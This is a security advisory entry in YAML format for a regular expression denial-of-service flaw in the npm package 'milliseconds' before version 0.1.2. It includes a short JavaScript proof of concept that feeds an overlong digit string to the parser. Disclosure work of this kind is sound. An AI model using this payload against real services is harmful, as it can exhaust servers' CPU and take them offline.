- id: nodesecurity:npm:milliseconds:2015-11-20
  title: Regular Expression Denial of Service
  description: |-
    Versions of `milliseconds` prior to 0.1.2 are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.


    ## Proof of concept
    ```
    var ms = require('millisecond');
    var genstr = function (len, chr) {
       var result = "";
       for (i=0; i<=len; i++) {
           result = result + chr;
       }

       return result;
    }

    ms(genstr(process.argv[2], "5") + " minutea");
    ```
  affected_package: milliseconds
  vulnerable_versions:
  - "<0.1.2"
  patched_versions:
  - ">=0.1.2"
  severity: medium
  package_manager: npm
  cve:
